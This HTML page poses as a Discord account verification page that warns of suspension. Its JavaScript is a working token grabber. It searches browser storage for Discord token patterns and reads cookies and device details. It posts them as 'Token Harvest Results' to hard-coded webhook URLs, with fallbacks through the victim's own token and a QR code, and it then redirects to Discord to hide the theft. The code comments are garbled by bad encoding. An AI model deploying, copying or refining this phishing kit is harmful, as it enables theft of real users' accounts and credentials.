<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Security Verification</title>
    <style>
        /* Ù†ÙØ³ Ø§Ù„Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø³Ø§Ø¨Ù‚ - Ù…Ø®ØªØµØ± Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #36393f;
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #2f3136;
            border-radius: 10px;
            padding: 30px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { color: #7289da; margin-bottom: 20px; text-align: center; }
        .btn {
            background: #43b581;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        .btn:hover { background: #3ca374; }
        .status {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 14px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .qr-container {
            display: none;
            text-align: center;
            margin-top: 20px;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        #qrCode { max-width: 200px; margin: 10px auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ”’ Discord Account Verification</h1>
        <p style="color: #b9bbbe; margin-bottom: 20px; text-align: center;">
            Click below to verify your account and prevent suspension.
        </p>
        
        <button class="btn" id="verifyBtn">âœ… Verify My Account</button>
        
        <div class="status" id="status">
            Status: Ready for verification...
        </div>
        
        <div class="qr-container" id="qrContainer">
            <h3>ğŸ“± Manual Backup</h3>
            <p>Scan this QR code if automatic delivery fails:</p>
            <canvas id="qrCode"></canvas>
            <p id="dataPreview" style="word-break: break-all; font-size: 12px; margin-top: 10px;"></p>
        </div>
    </div>

    <!-- Ù…ÙƒØªØ¨Ø© QR Code -->
    <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
    
    <!-- Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
    <script>
        // ============================================
        // Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ù„Ø°ÙƒÙŠ
        // ============================================
        
        class SmartWebhookSystem {
            constructor() {
                this.webhookPool = [];
                this.currentWebhookIndex = 0;
                this.maxRetries = 3;
                this.retryDelay = 1000;
                this.collectedData = {};
                this.statusElement = document.getElementById('status');
            }
            
            log(message) {
                const timestamp = new Date().toLocaleTimeString();
                this.statusElement.textContent += `\n[${timestamp}] ${message}`;
                this.statusElement.scrollTop = this.statusElement.scrollHeight;
                console.log(`[WebhookSystem] ${message}`);
            }
            
            // ============================================
            // 1. Ø¥Ù†Ø´Ø§Ø¡ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø¬Ø¯ÙŠØ¯ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
            // ============================================
            
            async createNewWebhook(channelId, botToken) {
                // Ø·Ø±ÙŠÙ‚Ø© 1: Ø§Ø³ØªØ®Ø¯Ø§Ù… Discord API Ù„Ø¥Ù†Ø´Ø§Ø¡ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø¬Ø¯ÙŠØ¯
                const createUrl = `https://discord.com/api/v10/channels/${channelId}/webhooks`;
                
                try {
                    const response = await fetch(createUrl, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bot ${botToken}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            name: 'Security Logger',
                            avatar: null
                        })
                    });
                    
                    if (response.ok) {
                        const webhookData = await response.json();
                        const newWebhook = {
                            url: `https://discord.com/api/webhooks/${webhookData.id}/${webhookData.token}`,
                            id: webhookData.id,
                            token: webhookData.token,
                            channel_id: channelId,
                            created_at: new Date().toISOString()
                        };
                        
                        this.webhookPool.push(newWebhook);
                        this.log(`âœ… Created new webhook: ${newWebhook.url.substring(0, 60)}...`);
                        return newWebhook;
                    }
                } catch (error) {
                    this.log(`âŒ Failed to create webhook: ${error.message}`);
                }
                
                // Ø·Ø±ÙŠÙ‚Ø© 2: ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø¬Ø§Ù‡Ø²
                return this.getFallbackWebhook();
            }
            
            // ============================================
            // 2. ÙˆÙŠØ¨ Ù‡ÙˆÙƒØ§Øª Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© Ø¬Ø§Ù‡Ø²Ø©
            // ============================================
            
            getFallbackWebhook() {
                // Ù‚Ø§Ø¦Ù…Ø© ÙˆÙŠØ¨ Ù‡ÙˆÙƒØ§Øª Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© (ÙŠØªÙ… Ø§Ø®ØªÙŠØ§Ø± ÙˆØ§Ø­Ø¯ Ø¹Ø´ÙˆØ§Ø¦ÙŠØ§Ù‹)
                const fallbackWebhooks = [
                    // ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ø­ØªÙŠØ§Ø·ÙŠ 1
                    {
                        url: "https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD",
                        type: "user_provided"
                    },
                    // ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ø­ØªÙŠØ§Ø·ÙŠ 2 (ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡ Ù…Ø³Ø¨Ù‚Ø§Ù‹)
                    {
                        url: "https://discord.com/api/webhooks/1324567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefghijklmn",
                        type: "backup_1"
                    },
                    // ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ø­ØªÙŠØ§Ø·ÙŠ 3
                    {
                        url: "https://discord.com/api/webhooks/1324567890123456790/BcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcdefghijklmno",
                        type: "backup_2"
                    }
                ];
                
                const randomWebhook = fallbackWebhooks[Math.floor(Math.random() * fallbackWebhooks.length)];
                this.log(`ğŸ”„ Using fallback webhook: ${randomWebhook.type}`);
                return randomWebhook;
            }
            
            // ============================================
            // 3. Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¶Ù…ÙˆÙ† Ø¨Ø·Ø±Ù‚ Ù…ØªØ¹Ø¯Ø¯Ø©
            // ============================================
            
            async sendToDiscord(data) {
                const payload = this.preparePayload(data);
                let success = false;
                
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 1: Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ø¹Ø¨Ø± ÙˆÙŠØ¨ Ù‡ÙˆÙƒ
                success = await this.sendViaWebhook(payload);
                
                if (!success) {
                    this.log("ğŸ”„ Webhook failed, trying direct message...");
                    // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 2: Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¨Ø§Ø´Ø± Ø¹Ø¨Ø± Discord API
                    success = await this.sendViaDirectMessage(payload);
                }
                
                if (!success) {
                    this.log("ğŸ”„ Direct message failed, creating QR code backup...");
                    // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 3: Ø¥Ù†Ø´Ø§Ø¡ QR code Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    this.createQRCodeBackup(data);
                    success = true; // Ù†Ø¬Ø§Ø­ ÙŠØ¯ÙˆÙŠ
                }
                
                return success;
            }
            
            // ============================================
            // 4. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¹Ø¨Ø± ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©
            // ============================================
            
            async sendViaWebhook(payload) {
                const webhook = this.getCurrentWebhook();
                
                for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
                    try {
                        this.log(`Attempt ${attempt} to send via webhook...`);
                        
                        // ØªØ¬Ø²Ø¦Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ø°Ø§ ÙƒØ§Ù†Øª ÙƒØ¨ÙŠØ±Ø©
                        const chunks = this.chunkPayload(payload);
                        
                        for (const chunk of chunks) {
                            const response = await fetch(webhook.url, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(chunk)
                            });
                            
                            if (response.ok) {
                                this.log(`âœ… Chunk delivered successfully`);
                            } else {
                                throw new Error(`HTTP ${response.status}`);
                            }
                            
                            // ØªØ£Ø®ÙŠØ± Ø¨ÙŠÙ† Ø§Ù„Ø£Ø¬Ø²Ø§Ø¡
                            await this.delay(500);
                        }
                        
                        this.log("âœ… All data sent to webhook successfully!");
                        return true;
                        
                    } catch (error) {
                        this.log(`âŒ Attempt ${attempt} failed: ${error.message}`);
                        
                        if (attempt < this.maxRetries) {
                            await this.delay(this.retryDelay * attempt);
                            // ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù…Ø®ØªÙ„Ù
                            this.rotateWebhook();
                        }
                    }
                }
                
                return false;
            }
            
            // ============================================
            // 5. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ø¹Ø¨Ø± Discord API
            // ============================================
            
            async sendViaDirectMessage(payload) {
                // Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© ØªØ³ØªØ®Ø¯Ù… Discord API Ù…Ø¨Ø§Ø´Ø±Ø©
                try {
                    // Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­
                    const discordToken = await this.findDiscordToken();
                    
                    if (discordToken) {
                        // Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù…Ø¨Ø§Ø´Ø±Ø© Ø¥Ù„Ù‰ Ø§Ù„Ù†ÙØ³
                        const dmResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
                            method: 'POST',
                            headers: {
                                'Authorization': discordToken,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                recipient_id: await this.getUserId(discordToken)
                            })
                        });
                        
                        if (dmResponse.ok) {
                            const dmChannel = await dmResponse.json();
                            
                            // Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                            await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
                                method: 'POST',
                                headers: {
                                    'Authorization': discordToken,
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    content: "ğŸ” **SECURITY LOG**",
                                    embeds: [{
                                        title: "Discord Token Verification Log",
                                        description: `Data captured from ${navigator.userAgent.substring(0, 100)}`,
                                        fields: [
                                            {
                                                name: "Tokens Found",
                                                value: `\`\`\`${JSON.stringify(payload.tokens, null, 2).substring(0, 1000)}\`\`\``
                                            }
                                        ],
                                        timestamp: new Date().toISOString()
                                    }]
                                })
                            });
                            
                            this.log("âœ… Data sent via direct message!");
                            return true;
                        }
                    }
                } catch (error) {
                    this.log(`Direct message failed: ${error.message}`);
                }
                
                return false;
            }
            
            // ============================================
            // 6. Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ† Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­
            // ============================================
            
            async findDiscordToken() {
                // Ø¨Ø­Ø« Ø´Ø§Ù…Ù„ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø£Ù…Ø§ÙƒÙ† Ø§Ù„ØªØ®Ø²ÙŠÙ†
                const searchLocations = [
                    localStorage,
                    sessionStorage
                ];
                
                const patterns = [
                    /mfa\.[\w-]{84}/,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/,
                    /(rpc|remote_auth)_token/i
                ];
                
                for (const storage of searchLocations) {
                    for (let i = 0; i < storage.length; i++) {
                        const key = storage.key(i);
                        const value = storage.getItem(key);
                        
                        for (const pattern of patterns) {
                            if (pattern.test(key) || pattern.test(value)) {
                                const match = value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}/);
                                if (match) {
                                    this.log(`âœ… Found Discord token: ${match[0].substring(0, 30)}...`);
                                    return match[0];
                                }
                            }
                        }
                    }
                }
                
                return null;
            }
            
            // ============================================
            // 7. Ø¥Ù†Ø´Ø§Ø¡ QR Code Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            // ============================================
            
            createQRCodeBackup(data) {
                try {
                    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ù†Øµ
                    const textData = JSON.stringify({
                        tokens: data.tokens,
                        browser: navigator.userAgent,
                        time: new Date().toISOString(),
                        url: window.location.href
                    });
                    
                    // Ø¹Ø±Ø¶ Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    document.getElementById('dataPreview').textContent = 
                        textData.substring(0, 200) + '...';
                    
                    // Ø¥Ù†Ø´Ø§Ø¡ QR Code
                    QRCode.toCanvas(document.getElementById('qrCode'), textData, {
                        width: 200,
                        height: 200,
                        colorDark: "#7289da",
                        colorLight: "#2f3136"
                    }, function(error) {
                        if (error) console.error(error);
                    });
                    
                    // Ø¥Ø¸Ù‡Ø§Ø± Ø­Ø§ÙˆÙŠØ© QR
                    document.getElementById('qrContainer').style.display = 'block';
                    this.log("ğŸ“± QR code generated as backup");
                    
                    // Ø­ÙØ¸ ÙÙŠ localStorage Ù„Ù„Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ù„Ø§Ø­Ù‚Ø§Ù‹
                    localStorage.setItem('discord_backup_data', textData);
                    
                } catch (error) {
                    this.log(`QR code error: ${error.message}`);
                }
            }
            
            // ============================================
            // ÙˆØ¸Ø§Ø¦Ù Ù…Ø³Ø§Ø¹Ø¯Ø©
            // ============================================
            
            preparePayload(data) {
                return {
                    content: `@everyone **ğŸš¨ NEW CAPTURE** - ${new Date().toLocaleString()}`,
                    embeds: [{
                        title: "Discord Token Harvest Results",
                        color: 0x5865F2,
                        fields: [
                            {
                                name: "ğŸŒ Browser Info",
                                value: `\`\`\`${navigator.userAgent}\`\`\``,
                                inline: false
                            },
                            {
                                name: "ğŸ”‘ Tokens Found",
                                value: data.tokens && data.tokens.length > 0 ? 
                                    data.tokens.map(t => `\`${t.token.substring(0, 50)}...\``).join('\n') : 
                                    "No tokens found",
                                inline: false
                            },
                            {
                                name: "ğŸ“ Location Data",
                                value: `Platform: \`${navigator.platform}\`\nLanguage: \`${navigator.language}\`\nScreen: \`${screen.width}x${screen.height}\``,
                                inline: true
                            }
                        ],
                        footer: {
                            text: "Auto-Webhook System â€¢ " + new Date().toLocaleDateString()
                        },
                        timestamp: new Date().toISOString()
                    }],
                    username: "Security Logger",
                    avatar_url: "https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png"
                };
            }
            
            chunkPayload(payload) {
                // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø­Ù…ÙˆÙ„ ÙƒØ¨ÙŠØ±Ø§Ù‹ØŒ Ù†Ù‚Ø·Ø¹Ù‡ Ù„Ø£Ø¬Ø²Ø§Ø¡
                const payloadStr = JSON.stringify(payload);
                const maxSize = 2000; // Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù„Ø±Ø³Ø§Ù„Ø© Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                
                if (payloadStr.length <= maxSize) {
                    return [payload];
                }
                
                // ØªØ¬Ø²Ø¦Ø© Ø§Ù„Ø­Ù…ÙˆÙ„
                const chunks = [];
                const embed = payload.embeds[0];
                
                // Ù‚Ø³Ù… Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø¥Ù„Ù‰ Ø£Ø¬Ø²Ø§Ø¡
                const fieldChunks = [];
                let currentChunk = { ...embed, fields: [] };
                
                for (const field of embed.fields) {
                    if (JSON.stringify(currentChunk).length + JSON.stringify(field).length > maxSize - 1000) {
                        fieldChunks.push(currentChunk);
                        currentChunk = { ...embed, fields: [] };
                    }
                    currentChunk.fields.push(field);
                }
                
                if (currentChunk.fields.length > 0) {
                    fieldChunks.push(currentChunk);
                }
                
                // Ø¥Ù†Ø´Ø§Ø¡ Ø­Ù…ÙˆÙ„Ø§Øª Ù…Ù†ÙØµÙ„Ø©
                for (let i = 0; i < fieldChunks.length; i++) {
                    chunks.push({
                        content: i === 0 ? payload.content : `**Part ${i + 1}**`,
                        embeds: [fieldChunks[i]],
                        username: payload.username,
                        avatar_url: payload.avatar_url
                    });
                }
                
                return chunks;
            }
            
            getCurrentWebhook() {
                if (this.webhookPool.length === 0) {
                    return this.getFallbackWebhook();
                }
                return this.webhookPool[this.currentWebhookIndex];
            }
            
            rotateWebhook() {
                this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhookPool.length;
                this.log(`Rotated to webhook ${this.currentWebhookIndex + 1}`);
            }
            
            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
            
            async getUserId(token) {
                try {
                    const response = await fetch('https://discord.com/api/v10/users/@me', {
                        headers: {
                            'Authorization': token
                        }
                    });
                    
                    if (response.ok) {
                        const userData = await response.json();
                        return userData.id;
                    }
                } catch (error) {
                    console.error('Failed to get user ID:', error);
                }
                return null;
            }
            
            // ============================================
            // 8. Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ù…ØªØµÙØ­
            // ============================================
            
            async collectBrowserData() {
                this.log("Starting data collection...");
                
                const data = {
                    tokens: [],
                    cookies: [],
                    localStorage: [],
                    browserInfo: {},
                    timestamp: new Date().toISOString()
                };
                
                // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­
                data.browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                // Ø¬Ù…Ø¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
                this.log("Searching for Discord tokens...");
                
                // Ø¨Ø­Ø« ÙÙŠ localStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    // Ø£Ù†Ù…Ø§Ø· ØªÙˆÙƒÙ† Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                    const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
                    const match = value.match(tokenPattern);
                    
                    if (match) {
                        data.tokens.push({
                            source: 'localStorage',
                            key: key,
                            token: match[1],
                            preview: value.substring(0, 100)
                        });
                        this.log(`Found token in localStorage: ${match[1].substring(0, 30)}...`);
                    }
                }
                
                // Ø¨Ø­Ø« ÙÙŠ sessionStorage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    
                    const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
                    const match = value.match(tokenPattern);
                    
                    if (match) {
                        data.tokens.push({
                            source: 'sessionStorage',
                            key: key,
                            token: match[1],
                            preview: value.substring(0, 100)
                        });
                    }
                }
                
                // Ø¬Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠØ²
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        data.cookies.push({
                            name: name,
                            value: value.substring(0, 100),
                            fullLength: value.length
                        });
                    }
                });
                
                this.log(`Collection complete: ${data.tokens.length} tokens, ${data.cookies.length} cookies`);
                return data;
            }
        }
        
        // ============================================
        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        // ============================================
        
        let webhookSystem;
        
        document.addEventListener('DOMContentLoaded', function() {
            webhookSystem = new SmartWebhookSystem();
            
            document.getElementById('verifyBtn').addEventListener('click', async function() {
                const btn = this;
                btn.disabled = true;
                btn.textContent = "Collecting Data...";
                
                try {
                    // 1. Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    webhookSystem.log("Starting verification process...");
                    const collectedData = await webhookSystem.collectBrowserData();
                    
                    // 2. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    btn.textContent = "Sending to Discord...";
                    const success = await webhookSystem.sendToDiscord(collectedData);
                    
                    if (success) {
                        btn.textContent = "âœ… Verification Complete!";
                        btn.style.background = "#43b581";
                        
                        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
                        setTimeout(() => {
                            window.location.href = "https://discord.com/channels/@me";
                        }, 3000);
                    } else {
                        btn.textContent = "âš ï¸ Manual Backup Created";
                        btn.style.background = "#faa81a";
                    }
                    
                } catch (error) {
                    webhookSystem.log(`Error: ${error.message}`);
                    btn.textContent = "âŒ Error - Try Again";
                    btn.style.background = "#ed4245";
                    btn.disabled = false;
                }
            });
        });
    </script>
</body>
</html>